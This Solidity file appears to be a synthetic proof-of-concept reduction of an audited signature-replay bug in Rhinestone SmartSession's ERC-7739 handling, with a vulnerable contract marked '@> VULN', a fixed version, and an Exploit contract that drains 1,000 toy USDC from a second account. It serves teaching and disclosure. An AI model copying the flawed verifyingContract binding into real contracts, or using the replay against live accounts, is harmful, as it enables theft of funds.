// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Rhinestone SmartSession ERC-7739 — verifyingContract is the module, not the account
    (Cantina, Chinmay Farkya, September 2024).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the nested EIP-712 hash stores SmartSession's own address as
    verifyingContract. A signature over that hash is valid for every account
    that shares the signer. Account B accepts the signature made for account A
    and sends 1,000 USDC. Chain id is pinned to 1 so the precomputed signature
    matches Foundry and the playground. Vulnerable mstore preserved below (@> VULN). */

contract Usdc {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fromBal = balanceOf[msg.sender];
        balanceOf[msg.sender] = fromBal - amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SmartSession {
    address public constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    bytes32 public constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    bytes32 public constant TRANSFER_TYPEHASH = keccak256("Transfer(address to,uint256 amount)");

    function eip712Domain()
        public
        view
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        )
    {
        fields = hex"0f";
        name = "SmartSession";
        version = "1";
        chainId = 1;
        // @> VULN: verifyingContract is SmartSession (address(this)), not the account
        verifyingContract = address(this);
        salt = bytes32(0);
        extensions = new uint256[](0);
    }

    function domainFor(address verifyingContract) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256(bytes("SmartSession")),
                keccak256(bytes("1")),
                uint256(1),
                verifyingContract
            )
        );
    }

    function digestFor(address verifyingContract, address to, uint256 amount) public pure returns (bytes32) {
        bytes32 structHash = keccak256(abi.encode(TRANSFER_TYPEHASH, to, amount));
        return keccak256(abi.encodePacked("\x19\x01", domainFor(verifyingContract), structHash));
    }

    function _typedDataSignFields() public view returns (address baked) {
        (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        ) = eip712Domain();
        bytes32 word;
        assembly {
            let m := mload(0x40)
            mstore(0x40, add(m, 0x120))
            mstore(add(m, 0x40), shl(248, byte(0, fields)))
            mstore(add(m, 0x60), keccak256(add(name, 0x20), mload(name)))
            mstore(add(m, 0x80), keccak256(add(version, 0x20), mload(version)))
            mstore(add(m, 0xa0), chainId)
            // @> VULN: verifyingContract is SmartSession, not the account (msg.sender)
            mstore(add(m, 0xc0), shr(96, shl(96, verifyingContract)))
            mstore(add(m, 0xe0), salt)
            mstore(add(m, 0x100), keccak256(add(extensions, 0x20), shl(5, mload(extensions))))
            word := mload(add(m, 0xc0))
        }
        baked = address(uint160(uint256(word)));
    }

    function transferDigest(address to, uint256 amount) public view returns (bytes32) {
        address baked = _typedDataSignFields();
        return digestFor(baked, to, amount);
    }

    function accept(address, address to, uint256 amount, bytes calldata sig) external view returns (bool) {
        return recover(transferDigest(to, amount), sig) == SIGNER;
    }

    function recover(bytes32 digest, bytes calldata sig) public pure returns (address) {
        require(sig.length == 65, "len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }
        if (v < 27) v += 27;
        return ecrecover(digest, v, r, s);
    }
}

contract SmartSessionFixed {
    address public constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    bytes32 public constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    bytes32 public constant TRANSFER_TYPEHASH = keccak256("Transfer(address to,uint256 amount)");

    function digestFor(address verifyingContract, address to, uint256 amount) public pure returns (bytes32) {
        bytes32 domain = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256(bytes("SmartSession")),
                keccak256(bytes("1")),
                uint256(1),
                verifyingContract
            )
        );
        bytes32 structHash = keccak256(abi.encode(TRANSFER_TYPEHASH, to, amount));
        return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
    }

    function accept(address account, address to, uint256 amount, bytes calldata sig) external pure returns (bool) {
        bytes32 digest = digestFor(account, to, amount);
        require(sig.length == 65, "len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }
        if (v < 27) v += 27;
        return ecrecover(digest, v, r, s) == SIGNER;
    }
}

contract Account {
    SmartSession public session;
    Usdc public token;

    constructor(SmartSession s, Usdc t) {
        session = s;
        token = t;
    }

    function execute(address to, uint256 amount, bytes calldata sig) external {
        require(session.accept(address(this), to, amount, sig), "sig");
        token.transfer(to, amount);
    }
}

contract AccountFixed {
    SmartSessionFixed public session;
    Usdc public token;

    constructor(SmartSessionFixed s, Usdc t) {
        session = s;
        token = t;
    }

    function execute(address to, uint256 amount, bytes calldata sig) external {
        require(session.accept(address(this), to, amount, sig), "sig");
        token.transfer(to, amount);
    }
}

contract Exploit {
    address public constant RECIPIENT = 0x3333333333333333333333333333333333333333;
    uint256 public constant AMOUNT = 1_000_000_000;

    Usdc public token; // CREATE nonce 1
    SmartSession public session; // CREATE nonce 2
    Account public accountA; // CREATE nonce 3
    Account public accountB; // CREATE nonce 4

    bytes public replaySig;

    constructor() {
        token = new Usdc();
        session = new SmartSession();
        accountA = new Account(session, token);
        accountB = new Account(session, token);
        token.mint(address(accountA), AMOUNT);
        token.mint(address(accountB), AMOUNT);
    }

    function setReplaySig(bytes calldata sig) external {
        replaySig = sig;
    }

    function run() external {
        bytes memory sig = replaySig;
        bool onA = session.accept(address(accountA), RECIPIENT, AMOUNT, sig);
        require(onA, "account A rejected its signature");
        accountB.execute(RECIPIENT, AMOUNT, sig);
        uint256 paid = token.balanceOf(RECIPIENT);
        uint256 leftA = token.balanceOf(address(accountA));
        uint256 leftB = token.balanceOf(address(accountB));
        require(paid == AMOUNT, "B paid 1000");
        require(leftA == AMOUNT, "A was debited");
        require(leftB == 0, "B kept the funds");
    }
}
